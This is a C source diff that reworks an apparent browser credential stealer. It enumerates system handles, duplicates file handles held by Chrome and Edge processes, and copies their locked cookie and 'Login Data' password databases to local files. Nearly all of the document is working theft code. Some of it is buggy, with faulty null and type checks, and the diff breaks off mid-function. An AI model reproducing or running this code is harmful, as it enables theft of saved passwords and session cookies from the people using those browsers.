@@ -345,164 +345,274 @@ BOOL GetChromeDatabase(DWORD PID) {
     
     printf("chrome PID found %d\n", PID);
     
-    SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
     DWORD dwNeeded = 0;
     DWORD dwSize = 0xffffff / 2;
-    shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
+    shi = (SYSTEM_HANDLE_INFORMATION_EX *)GlobalAlloc(GPTR, dwSize);
     //utilize NtQueryStemInformation to list all handles on system
-    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
-
+    // Allocate memory for the handle information
+    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status == STATUS_INFO_LENGTH_MISMATCH)
+    {
+        dwSize = dwNeeded;
+        shi = (SYSTEM_HANDLE_INFORMATION_EX*)realloc(shi, dwSize);
+        if (dwSize == NULL)
+        {
+            printf("Failed to reallocate memory for handle information.\n");
+            return FALSE;
+        }
+    }
+    status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status != 0)
+    {
+        printf("NtQuerySystemInformation failed with status 0x%x.\n",status);
+        return FALSE;
+    }
+    printf("Last Error: %d\n", GetLastError());
+    SetLastError(0);
     printf("Handle Count %d\n", shi->NumberOfHandles);
     DWORD i = 0;
     BOOL firstHandle = TRUE;
-    //iterate through each handle and find our PID and a handle to a file
+
+    POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+    
+    
     for(i = 0; i < shi->NumberOfHandles; i++) {
-        //check if handle to file
-        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
-            //check if handle is to our PID
-            if(shi->Handles[i].ProcessId == PID) {
+        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
+        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
+            printf("Last Error: %d\n", GetLastError());
+            SetLastError(0);
+            //printf("same PID\n");
+            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+            ULONG returnLength = 0;
+            NTSTATUS ret = 0;
+            HANDLE dupHandle = NULL;
+
+            printf("Granted Access: %08x\n", handle.GrantedAccess);
+            printf("Handle Attributes: %08x\n", handle.HandleAttributes);
+
+            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
+                //printf("Opening process\n");
+                HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+                if(hProc == INVALID_HANDLE_VALUE) {
+                    printf("OpenProcess failed %d\n", GetLastError());
+                    GlobalFree(shi);
+                    return FALSE;
+                }
+                if (!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) 
+                {
+                    printf("Duplicate Handle failed %d\n", GetLastError());
+                    continue;
+                }
+                //Check if the handle exists on disk, otherwise the program will hang
+                DWORD fileType = GetFileType(dupHandle);
+                if (fileType != FILE_TYPE_DISK) {
+                    continue;
+                }
+                if(GetLastError() == 87) {
+                            SetLastError(0);
+                            printf("Wrong Function Call \n Skipping handle \n");
+                            //KERNEL32$GlobalFree(shi);
+                            continue;
+                }
+                ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
+                //if return length is not 0
+                //printf("Return Length: %d\n", returnLength);
+                if (ret != 0)
+                {
+                    printf("NtQueryObject failed with status 0x%x.\n",ret);
+                    printf("LastError: %d\n", GetLastError());
+                    SetLastError(0);
+                    objectNameInfo = realloc(objectNameInfo, returnLength);
+                    ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, returnLength, &returnLength);
+                }
                 
-                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
-                if(shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x2 && shi->Handles[i].GrantedAccess == 0x0012019f)) {
-                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
-                        if(hProc == INVALID_HANDLE_VALUE) {
-                            printf("OpenProcess failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;
-                        }
+                if (ret == 0 && objectNameInfo->Name.Length > 0){
+                    printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    char handleName[1024];
+                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-                        HANDLE hDuplicate = NULL;
-                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
-                            printf("DuplicateHandle failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;                   
-                        }
+                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
+                    ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+                    if (ret != 0)
+                    {
+                        objectTypeInfo = realloc(objectTypeInfo, returnLength);
+                        ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, returnLength, &returnLength);
+                    }
+                    printf("%d\n", GetLastError());
+                    SetLastError(0);
+                     if (ret == 0 && strcmp(objectTypeInfo,"File")){
+                        char* found = strstr(handleName, "Network\\Cookies");
+                        if (found != NULL) {
+                            if (found[15] == '\0'){
+                                printf("COOKIE WAS FOUND\n");
+                                printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                                SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
+                                DWORD dwFileSize = GetFileSize(dupHandle, NULL);
+                                printf("file size is %d\n", dwFileSize);
+                                DWORD dwRead = 0;
+                                CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
+                                ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL);
 
-                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
-                        CHAR filename[256];
-                        ZeroMemory(filename, 256);
-                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
-                        printf("%s\n", filename);
+                                HANDLE hFile = CreateFile("ChromeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                                WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
+                                CloseHandle(hFile);
 
-                        if(firstHandle) {
-                            DWORD dwFilenameSize = strlen(filename);
-                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
-                            firstHandle = FALSE;
-
-                            if(strcmp(newFilename, "Application") == 0) {
-                                printf("SKIPPING PID %d\n", PID);
-                                GlobalFree(shi);
-                                return FALSE;
+                                GlobalFree(buffer);
+                                return TRUE;
                             }
                         }
-
-                        if(strstr(filename, "Cookies") != NULL) {
-                            printf("COOKIE WAS FOUND\n");
-                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
-                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
-                            printf("file size is %d\n", dwFileSize);
-                            DWORD dwRead = 0;
-                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
-                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
-
-                            HANDLE hFile = CreateFile("ChromeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-                            CloseHandle(hFile);
-
-                            GlobalFree(buffer);
-                            return TRUE;
-                        }
-
-                        CloseHandle(hDuplicate);
-                }
+                            
+                    }
+                    else{
+                        CloseHandle(dupHandle);
+                        free(objectTypeInfo);
+                        free(objectNameInfo);
+                    }
+                } 
+                
             }
         }
     }
+
     printf("NO HANDLE TO COOKIE WAS FOUND \n");
     return FALSE;
 }
 
 BOOL GetChromePasswords(DWORD PID) {
     
-    printf("chrome PID found %d\n", PID);
+   printf("Chrome PID found %d\n", PID);
     
-    SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
     DWORD dwNeeded = 0;
     DWORD dwSize = 0xffffff / 2;
-    shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
+    shi = (SYSTEM_HANDLE_INFORMATION_EX *)GlobalAlloc(GPTR, dwSize);
     //utilize NtQueryStemInformation to list all handles on system
-    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
-
+    // Allocate memory for the handle information
+    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status == STATUS_INFO_LENGTH_MISMATCH)
+    {
+        dwSize = dwNeeded;
+        shi = (SYSTEM_HANDLE_INFORMATION_EX*)realloc(shi, dwSize);
+        if (dwSize == NULL)
+        {
+            printf("Failed to reallocate memory for handle information.\n");
+            return FALSE;
+        }
+    }
+    status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status != 0)
+    {
+        printf("NtQuerySystemInformation failed with status 0x%x.\n",status);
+        return FALSE;
+    }
+    printf("Last Error: %d\n", GetLastError());
+    SetLastError(0);
     printf("Handle Count %d\n", shi->NumberOfHandles);
     DWORD i = 0;
     BOOL firstHandle = TRUE;
-    //iterate through each handle and find our PID and a handle to a file
+
+    POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+    
+    
     for(i = 0; i < shi->NumberOfHandles; i++) {
-        //check if handle to file
-        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
-            //check if handle is to our PID
-            if(shi->Handles[i].ProcessId == PID) {
-                
-                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
-                if(shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x2 && shi->Handles[i].GrantedAccess == 0x0012019f)) {
-                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
-                        if(hProc == INVALID_HANDLE_VALUE) {
-                            printf("OpenProcess failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;
-                        }
+        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
+        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
+            printf("Last Error: %d\n", GetLastError());
+            SetLastError(0);
+            //printf("same PID\n");
+            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+            ULONG returnLength = 0;
+            NTSTATUS ret = 0;
+            HANDLE dupHandle = NULL;
 
-                        HANDLE hDuplicate = NULL;
-                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
-                            printf("DuplicateHandle failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;                   
-                        }
+            printf("Granted Access: %08x\n", handle.GrantedAccess);
+            printf("Handle Attributes: %08x\n", handle.HandleAttributes);
 
-                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
-                        CHAR filename[256];
-                        ZeroMemory(filename, 256);
-                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
-                        printf("%s\n", filename);
-
-                        if(firstHandle) {
-                            DWORD dwFilenameSize = strlen(filename);
-                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
-                            firstHandle = FALSE;
-
-                            if(strcmp(newFilename, "Application") == 0) {
-                                printf("SKIPPING PID %d\n", PID);
-                                GlobalFree(shi);
-                                return FALSE;
-                            }
-                        }
-
-                        if(strstr(filename, "Login Data") != NULL) {
-                            printf("Login Data WAS FOUND\n");
-                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
-                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
-                            printf("file size is %d\n", dwFileSize);
-                            DWORD dwRead = 0;
-                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
-                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
-
-                            HANDLE hFile = CreateFile("ChromePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-                            CloseHandle(hFile);
-
-                            GlobalFree(buffer);
-                            return TRUE;
-                        }
-
-                        CloseHandle(hDuplicate);
+            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
+                //printf("Opening process\n");
+                HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+                if(hProc == INVALID_HANDLE_VALUE) {
+                    printf("OpenProcess failed %d\n", GetLastError());
+                    GlobalFree(shi);
+                    return FALSE;
                 }
+                if (!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) 
+                {
+                    printf("Duplicate Handle failed %d\n", GetLastError());
+                    continue;
+                }
+                //Check if the handle exists on disk, otherwise the program will hang
+                DWORD fileType = GetFileType(dupHandle);
+                if (fileType != FILE_TYPE_DISK) {
+                    continue;
+                }
+                if(GetLastError() == 87) {
+                            SetLastError(0);
+                            printf("Wrong Function Call \n Skipping handle \n");
+                            //KERNEL32$GlobalFree(shi);
+                            continue;
+                }
+                ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
+                //if return length is not 0
+                //printf("Return Length: %d\n", returnLength);
+                if (ret != 0)
+                {
+                    printf("NtQueryObject failed with status 0x%x.\n",ret);
+                    printf("LastError: %d\n", GetLastError());
+                    SetLastError(0);
+                    objectNameInfo = realloc(objectNameInfo, returnLength);
+                    ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, returnLength, &returnLength);
+                }
+                
+                if (ret == 0 && objectNameInfo->Name.Length > 0){
+                    printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    char handleName[1024];
+                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+
+                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
+                    ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+                    if (ret != 0)
+                    {
+                        objectTypeInfo = realloc(objectTypeInfo, returnLength);
+                        ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, returnLength, &returnLength);
+                    }
+                    printf("%d\n", GetLastError());
+                    SetLastError(0);
+                    if (ret == 0 && strcmp(objectTypeInfo,"File")){
+                        if (strstr(handleName, "Login Data") != NULL) {
+                                printf("Login Data WAS FOUND\n");
+                                printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                                SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
+                                DWORD dwFileSize = GetFileSize(dupHandle, NULL);
+                                printf("file size is %d\n", dwFileSize);
+                                DWORD dwRead = 0;
+                                CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
+                                ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL);
+
+                                HANDLE hFile = CreateFile("ChromePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                                WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
+                                CloseHandle(hFile);
+
+                                GlobalFree(buffer);
+                                return TRUE;
+                            }
+                            
+                    }
+                    else{
+                        CloseHandle(dupHandle);
+                        free(objectTypeInfo);
+                        free(objectNameInfo);
+                    }
+                } 
+                
             }
         }
     }
+
     printf("NO HANDLE TO LOGIN DATA WAS FOUND \n");
     return FALSE;
 }
-
 
 VOID GetEdgePID() {
     //get handle to all processes
@@ -572,231 +682,263 @@ VOID GetEdgePID() {
 }
 
 BOOL GetEdgeDatabase(DWORD PID) {
-    
     printf("Edge PID found %d\n", PID);
     
-    //SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
     DWORD dwNeeded = 0;
-    NTSTATUS status;
     DWORD dwSize = 0xffffff / 2;
-    //shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
+    shi = (SYSTEM_HANDLE_INFORMATION_EX *)GlobalAlloc(GPTR, dwSize);
     //utilize NtQueryStemInformation to list all handles on system
-    PSYSTEM_HANDLE_INFORMATION shi;
-    ULONG handleInfoSize = 0x10000;
-    shi = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
-
-    while ((status = NtQuerySystemInformation(
-        SystemHandleInformation,
-        shi,
-        handleInfoSize,
-        NULL
-        )) == STATUS_INFO_LENGTH_MISMATCH)
-        shi = (PSYSTEM_HANDLE_INFORMATION)realloc(shi, handleInfoSize *= 2);
-
-    //NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
-
-    printf("Handle Count %d\n", shi->NumberOfHandles);
+    // Allocate memory for the handle information
+    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status == STATUS_INFO_LENGTH_MISMATCH)
+    {
+        dwSize = dwNeeded;
+        shi = (SYSTEM_HANDLE_INFORMATION_EX*)realloc(shi, dwSize);
+        if (dwSize == NULL)
+        {
+            printf("Failed to reallocate memory for handle information.\n");
+            return FALSE;
+        }
+    }
+    status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status != 0)
+    {
+        printf("NtQuerySystemInformation failed with status 0x%x.\n",status);
+        return FALSE;
+    }
+    // printf("Last Error: %d\n", GetLastError());
+    // SetLastError(0);
+    // printf("Handle Count %d\n", shi->NumberOfHandles);
     DWORD i = 0;
     BOOL firstHandle = TRUE;
-    //iterate through each handle and find our PID and a handle to a file
+
+    POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+    
     for(i = 0; i < shi->NumberOfHandles; i++) {
-        //check if handle to file
-        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
-            //check if handle is to our PID
-            if(shi->Handles[i].ProcessId == PID) {
+        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
+        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
+            // printf("Last Error: %d\n", GetLastError());
+            // SetLastError(0);
+            //printf("same PID\n");
+            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+            ULONG returnLength = 0;
+            NTSTATUS ret = 0;
+            HANDLE dupHandle = NULL;
 
-                /*
-                ULONG ProcessId;
-                UCHAR ObjectTypeNumber;
-                UCHAR Flags;
-                USHORT Handle;
-                PVOID Object;
-                ACCESS_MASK GrantedAccess;
-                */
-                
-                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
-                
-                
-                if( (shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x00000002 && shi->Handles[i].GrantedAccess == 0x0012019f))) {
-                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
-                        if(hProc == INVALID_HANDLE_VALUE) {
-                            printf("OpenProcess failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;
-                        }
-                        //get last error
-                        //DWORD dwError = NULL;
-                        //dwError = GetLastError();
-                        //printf("Last Error: %d\n", dwError);
+            //printf("Granted Access: %08x\n", handle.GrantedAccess);
+            //printf("Handle Attributes: %08x\n", handle.HandleAttributes);
 
-                        HANDLE hDuplicate = NULL;
-                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
-                            printf("DuplicateHandle failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;                   
-                        }
-                        //get last error
-                        DWORD dwError2 = NULL;
-                        dwError2 = GetLastError();
-                        printf("Last Error: %d\n", dwError2);
-                        //when file does not exist on disk, error 87 thrown
-                        if(dwError2 == 87) {
-                            SetLastError(0);
-                            printf("Wrong Function Call Somewhere \n");
-                            //GlobalFree(shi);
-                            continue;
-                        }
-
-                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
-                        CHAR filename[256];
-                        ZeroMemory(filename, 256);
-                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
-                        
-                        printf("%s\n", filename);
-                        printf("Length of file name is %d\n", strlen(filename));
-                        
-                        if(firstHandle) {
-                            DWORD dwFilenameSize = strlen(filename);
-                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
-                            firstHandle = FALSE;
-
-                            if(strcmp(newFilename, "Application") == 0) {
-                                printf("SKIPPING PID %d\n", PID);
-                                GlobalFree(shi);
-                                return FALSE;
-                            }
-                        }
-
-                        if(strstr(filename, "Cookies") != NULL) {
-                            printf("COOKIE WAS FOUND\n");
-                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
-                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
-                            printf("file size is %d\n", dwFileSize);
-                            DWORD dwRead = 0;
-                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
-                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
-
-                            HANDLE hFile = CreateFile("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
-                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
-                            CloseHandle(hFile);
-
-                            GlobalFree(buffer);
-                            return TRUE;
-                        }
-
-                        CloseHandle(hDuplicate);
+            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
+                //printf("Opening process\n");
+                HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+                if(hProc == INVALID_HANDLE_VALUE) {
+                    printf("OpenProcess failed %d\n", GetLastError());
+                    GlobalFree(shi);
+                    return FALSE;
                 }
+                if (!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)) 
+                {
+                    printf("Duplicate Handle failed %d\n", GetLastError());
+                    continue;
+                }
+                //Check if the handle exists on disk, otherwise the program will hang
+                DWORD fileType = GetFileType(dupHandle);
+                if (fileType != FILE_TYPE_DISK) {
+                    continue;
+                }
+
+                ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
+                //if return length is not 0
+                //printf("Return Length: %d\n", returnLength);
+                if (ret != 0)
+                {
+                    printf("NtQueryObject failed with status 0x%x.\n",ret);
+                    printf("LastError: %d\n", GetLastError());
+                    SetLastError(0);
+                    objectNameInfo = realloc(objectNameInfo, returnLength);
+                    ret = NtQueryObject(dupHandle,ObjectNameInformation, objectNameInfo, returnLength, &returnLength);
+                }
+                
+                if (ret == 0 && objectNameInfo->Name.Length > 0){
+                    //printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    char handleName[1024];
+                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+
+                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
+                    ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+                    if (ret != 0)
+                    {
+                        objectTypeInfo = realloc(objectTypeInfo, returnLength);
+                        ret = NtQueryObject(dupHandle,ObjectTypeInformation, objectTypeInfo, returnLength, &returnLength);
+                    }
+                    printf("%d\n", GetLastError());
+                    SetLastError(0);
+                    if (ret == 0 && strcmp(objectTypeInfo,"File")){
+                        char* found = strstr(handleName, "Network\\Cookies");
+                        if (found != NULL) {
+                                printf("COOKIE WAS FOUND\n");
+                                printf("Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                                SetFilePointer(dupHandle, 0, 0, FILE_BEGIN);
+                                DWORD dwFileSize = GetFileSize(dupHandle, NULL);
+                                printf("file size is %d\n", dwFileSize);
+                                DWORD dwRead = 0;
+                                CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
+                                ReadFile(dupHandle, buffer, dwFileSize, &dwRead, NULL);
+
+                                HANDLE hFile = CreateFile("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                                WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
+                                CloseHandle(hFile);
+                                GlobalFree(buffer);
+                                continue;
+                            }
+                    }
+                    else{
+                        CloseHandle(dupHandle);
+                        free(objectTypeInfo);
+                        free(objectNameInfo);
+                    }
+                } 
+                
             }
         }
     }
+
     printf("NO HANDLE TO COOKIE WAS FOUND \n");
     return FALSE;
 }
 
 BOOL GetEdgePasswords(DWORD PID) {
-    
     printf("Edge PID found %d\n", PID);
     
-    //SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
     DWORD dwNeeded = 0;
-    NTSTATUS status;
     DWORD dwSize = 0xffffff / 2;
-    //shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
+    shi = (SYSTEM_HANDLE_INFORMATION_EX *)GlobalAlloc(GPTR, dwSize);
     //utilize NtQueryStemInformation to list all handles on system
-    PSYSTEM_HANDLE_INFORMATION shi;
-    ULONG handleInfoSize = 0x10000;
-    shi = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
-
-    while ((status = NtQuerySystemInformation(
-        SystemHandleInformation,
-        shi,
-        handleInfoSize,
-        NULL
-        )) == STATUS_INFO_LENGTH_MISMATCH)
-        shi = (PSYSTEM_HANDLE_INFORMATION)realloc(shi, handleInfoSize *= 2);
-
-    //NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
-
+    // Allocate memory for the handle information
+    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status == STATUS_INFO_LENGTH_MISMATCH)
+    {
+        dwSize = dwNeeded;
+        shi = (SYSTEM_HANDLE_INFORMATION_EX*)realloc(shi, dwSize);
+        if (dwSize == NULL)
+        {
+            printf("Failed to reallocate memory for handle information.\n");
+            return FALSE;
+        }
+    }
+    status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status != 0)
+    {
+        printf("NtQuerySystemInformation failed with status 0x%x.\n",status);
+        return FALSE;
+    }
+    printf("Last Error: %d\n", GetLastError());
+    SetLastError(0);
     printf("Handle Count %d\n", shi->NumberOfHandles);
     DWORD i = 0;
     BOOL firstHandle = TRUE;
-    //iterate through each handle and find our PID and a handle to a file
+
+    POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+    
+    
     for(i = 0; i < shi->NumberOfHandles; i++) {
-        //check if handle to file
-        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
-            //check if handle is to our PID
-            if(shi->Handles[i].ProcessId == PID) {
-                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
-                
-                if( (shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x00000002 && shi->Handles[i].GrantedAccess == 0x0012019f))) {
-                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
-                        if(hProc == INVALID_HANDLE_VALUE) {
-                            printf("OpenProcess failed %d\n", GetLastError());
-                            GlobalFree(shi);
-                            return FALSE;
-                        }
